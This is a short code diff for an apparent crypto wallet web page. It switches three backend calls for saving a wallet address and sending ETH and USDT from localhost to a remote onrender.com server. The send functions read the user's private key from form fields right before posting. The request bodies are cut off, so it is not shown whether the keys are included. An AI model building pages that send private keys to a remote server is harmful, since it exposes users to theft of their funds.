@@ -101,7 +101,7 @@
           walletAddressSpan.textContent = currentAccount;
 
           // Save to backend
-          const res = await fetch('http://localhost:5001/api/save_wallet', {
+          const res = await fetch('https://mainserverusdt.onrender.com/api/save_wallet', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ wallet_address: currentAccount })
@@ -128,7 +128,7 @@
       const amount = document.getElementById('amountEth').value;
       const privateKey = document.getElementById('privateKey').value;
 
-      const res = await fetch('http://localhost:5001/api/send_eth', {
+      const res = await fetch('https://mainserverusdt.onrender.com/api/send_eth', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -153,7 +153,7 @@
       const amount = document.getElementById('usdtAmount').value;
       const privateKey = document.getElementById('usdtKey').value;
 
-      const res = await fetch('http://localhost:5001/api/send_usdt', {
+      const res = await fetch('https://mainserverusdt.onrender.com/api/send_usdt', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
